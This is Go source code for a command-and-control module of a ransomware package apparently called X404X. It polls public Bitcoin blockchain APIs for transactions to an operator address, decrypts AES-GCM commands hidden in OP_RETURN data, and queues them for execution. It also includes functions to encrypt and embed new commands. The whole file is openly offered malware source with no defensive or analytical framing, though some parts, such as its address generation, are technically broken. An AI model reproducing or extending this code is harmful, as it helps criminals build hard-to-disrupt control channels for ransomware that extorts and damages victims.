package ransomware

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	// "strings"
	"sync"
	"time"
)

type BlockchainC2Engine struct {
	config          *RansomwareConfig
	BTCAddress      string            `json:"btc_address"`
	ETHAddress      string            `json:"eth_address"`
	MonitoringKey   []byte            `json:"-"`
	LastBlock       int64             `json:"last_block"`
	PendingCommands []BlockchainCmd   `json:"pending_commands"`
	mu              sync.Mutex
	running         bool
}

type BlockchainCmd struct {
	ID        string    `json:"id"`
	Action    string    `json:"action"`
	Payload   string    `json:"payload"`
	Timestamp time.Time `json:"timestamp"`
	TxID      string    `json:"tx_id"`
	Executed  bool      `json:"executed"`
}

type BlockchainTransaction struct {
	TxID     string `json:"txid"`
	Vout     []Vout `json:"vout"`
}

type Vout struct {
	ScriptPubKey ScriptPubKey `json:"scriptpubkey"`
}

type ScriptPubKey struct {
	Asm string `json:"asm"`
	Hex string `json:"hex"`
}

type BlockstreamUTXO struct {
	TxID  string `json:"txid"`
	Vout  int    `json:"vout"`
	Value int64  `json:"value"`
	Status struct {
		Confirmed bool  `json:"confirmed"`
		BlockTime int64 `json:"block_time"`
	} `json:"status"`
}

var blockchainAPIs = []string{
	"https://blockstream.info/api",
	"https://blockchain.info",
	"https://api.blockcypher.com/v1/btc/main",
}

func NewBlockchainC2Engine(cfg *RansomwareConfig) *BlockchainC2Engine {
	monKey := make([]byte, 32)
	rand.Read(monKey)

	return &BlockchainC2Engine{
		config:        cfg,
		BTCAddress:    "1X404XMalwareC2AddressPlaceholder",
		ETHAddress:    "0xX404XEthC2AddressPlaceholder",
		MonitoringKey: monKey,
	}
}

func (bc *BlockchainC2Engine) StartMonitoring() {
	bc.running = true
	go bc.monitorLoop()
}

func (bc *BlockchainC2Engine) monitorLoop() {
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()

	for bc.running {
		commands := bc.checkBlockchainForCommands()
		bc.mu.Lock()
		bc.PendingCommands = append(bc.PendingCommands, commands...)
		bc.mu.Unlock()
		<-ticker.C
	}
}

func (bc *BlockchainC2Engine) checkBlockchainForCommands() []BlockchainCmd {
	var commands []BlockchainCmd

	for _, api := range blockchainAPIs {
		cmds, err := bc.checkAPI(api)
		if err == nil && len(cmds) > 0 {
			commands = append(commands, cmds...)
			break
		}
	}

	return commands
}

func (bc *BlockchainC2Engine) checkAPI(apiURL string) ([]BlockchainCmd, error) {
	var commands []BlockchainCmd

	url := fmt.Sprintf("%s/address/%s/txs", apiURL, bc.BTCAddress)
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var txs []BlockstreamUTXO
	if err := json.Unmarshal(body, &txs); err != nil {
		var legacyTxs []map[string]interface{}
		if err2 := json.Unmarshal(body, &legacyTxs); err2 == nil {
			for _, tx := range legacyTxs {
				if txid, ok := tx["hash"].(string); ok {
					cmd := bc.decodeOPReturn(txid, tx)
					if cmd != nil {
						commands = append(commands, *cmd)
					}
				}
			}
		}
		return commands, nil
	}

	for _, tx := range txs {
		if !tx.Status.Confirmed {
			continue
		}
		if int64(tx.Status.BlockTime) <= bc.LastBlock {
			continue
		}

		rawURL := fmt.Sprintf("%s/tx/%s/hex", apiURL, tx.TxID)
		rawResp, err := http.Get(rawURL)
		if err != nil {
			continue
		}
		defer rawResp.Body.Close()

		rawHex, _ := io.ReadAll(rawResp.Body)
		cmd := bc.extractCommandFromRaw(string(rawHex), tx.TxID)
		if cmd != nil {
			commands = append(commands, *cmd)
		}
		bc.LastBlock = int64(tx.Status.BlockTime)
	}

	return commands, nil
}

func (bc *BlockchainC2Engine) decodeOPReturn(txid string, tx map[string]interface{}) *BlockchainCmd {
	outs, ok := tx["out"].([]interface{})
	if !ok {
		return nil
	}

	for _, out := range outs {
		o, ok := out.(map[string]interface{})
		if !ok {
			continue
		}
		script, ok := o["script"].(string)
		if !ok {
			continue
		}

		decoded, err := hex.DecodeString(script)
		if err != nil {
			continue
		}

		if bytes.Contains(decoded, []byte("OP_RETURN")) {
			parts := bytes.Split(decoded, []byte("OP_RETURN"))
			if len(parts) < 2 {
				continue
			}
			data := bytes.TrimSpace(parts[1])

			decrypted, err := bc.decryptCommand(data)
			if err != nil {
				continue
			}

			var cmd BlockchainCmd
			if err := json.Unmarshal(decrypted, &cmd); err == nil {
				cmd.TxID = txid
				cmd.Timestamp = time.Now()
				return &cmd
			}
		}
	}

	return nil
}

func (bc *BlockchainC2Engine) extractCommandFromRaw(rawHex, txid string) *BlockchainCmd {
	data, err := hex.DecodeString(rawHex)
	if err != nil || len(data) < 100 {
		return nil
	}

	opReturnIndex := bytes.Index(data, []byte{0x6a})
	if opReturnIndex < 0 {
		return nil
	}

	opReturnData := data[opReturnIndex:]
	if len(opReturnData) < 3 {
		return nil
	}

	dataLen := int(opReturnData[1])
	if dataLen > len(opReturnData)-2 {
		return nil
	}

	payload := opReturnData[2 : 2+dataLen]
	decrypted, err := bc.decryptCommand(payload)
	if err != nil {
		return nil
	}

	var cmd BlockchainCmd
	if err := json.Unmarshal(decrypted, &cmd); err == nil {
		cmd.TxID = txid
		cmd.Timestamp = time.Now()
		return &cmd
	}

	return nil
}

func (bc *BlockchainC2Engine) encryptCommand(cmd BlockchainCmd) ([]byte, error) {
	data, err := json.Marshal(cmd)
	if err != nil {
		return nil, err
	}

	block, err := aes.NewCipher(bc.MonitoringKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)

	return gcm.Seal(nonce, nonce, data, nil), nil
}

func (bc *BlockchainC2Engine) decryptCommand(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(bc.MonitoringKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("data too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func (bc *BlockchainC2Engine) DecodeCommand(data []byte) (*BlockchainCmd, error) {
	decrypted, err := bc.decryptCommand(data)
	if err != nil {
		decrypted = data
	}

	var cmd BlockchainCmd
	if err := json.Unmarshal(decrypted, &cmd); err != nil {
		return nil, err
	}
	return &cmd, nil
}

func (bc *BlockchainC2Engine) GenerateCommand(action, payload string) BlockchainCmd {
	id := make([]byte, 16)
	rand.Read(id)
	return BlockchainCmd{
		ID:        hex.EncodeToString(id),
		Action:    action,
		Payload:   payload,
		Timestamp: time.Now(),
	}
}

func (bc *BlockchainC2Engine) PrepareOPReturn(cmd BlockchainCmd) string {
	encrypted, _ := bc.encryptCommand(cmd)
	return fmt.Sprintf("OP_RETURN %s", hex.EncodeToString(encrypted))
}

func (bc *BlockchainC2Engine) GetPendingCommands() []BlockchainCmd {
	bc.mu.Lock()
	defer bc.mu.Unlock()

	unexecuted := make([]BlockchainCmd, 0)
	for _, cmd := range bc.PendingCommands {
		if !cmd.Executed {
			unexecuted = append(unexecuted, cmd)
		}
	}
	return unexecuted
}

func (bc *BlockchainC2Engine) MarkExecuted(txid string) {
	bc.mu.Lock()
	defer bc.mu.Unlock()

	for i := range bc.PendingCommands {
		if bc.PendingCommands[i].TxID == txid {
			bc.PendingCommands[i].Executed = true
			break
		}
	}
}

func (bc *BlockchainC2Engine) MonitorTransactions(address string) []BlockchainTransaction {
	url := fmt.Sprintf("https://blockstream.info/api/address/%s/txs", address)
	resp, err := http.Get(url)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	var txs []BlockchainTransaction
	json.NewDecoder(resp.Body).Decode(&txs)
	return txs
}

func (bc *BlockchainC2Engine) EmbedCommandInBlockchain(cmd BlockchainCmd) (string, error) {
	opReturn := bc.PrepareOPReturn(cmd)

	btcCmd := fmt.Sprintf(`# X404X Blockchain C2 - Embed Command
# Command: %s
# Action: %s
# To execute, create a Bitcoin transaction with:
# %s
# Send 0.00000547 BTC to %s with this OP_RETURN
`, cmd.ID, cmd.Action, opReturn, bc.BTCAddress)

	cmdPath := filepath.Join(os.TempDir(), "x404x_blockchain_cmd.txt")
	os.WriteFile(cmdPath, []byte(btcCmd), 0644)

	return opReturn, nil
}

func (bc *BlockchainC2Engine) Stop() {
	bc.running = false
}

func (bc *BlockchainC2Engine) GenerateNewAddress() (string, string) {
	privKey := make([]byte, 32)
	rand.Read(privKey)
	pubKey := sha256.Sum256(privKey)
	addr := hex.EncodeToString(pubKey[:20])
	return addr, hex.EncodeToString(privKey)
}

func (bc *BlockchainC2Engine) GetStatusJSON() string {
	cmds := bc.GetPendingCommands()
	data, _ := json.Marshal(map[string]interface{}{
		"btc_address":      bc.BTCAddress,
		"eth_address":      bc.ETHAddress,
		"last_block":       bc.LastBlock,
		"pending_commands": len(cmds),
		"running":          bc.running,
	})
	return string(data)
}


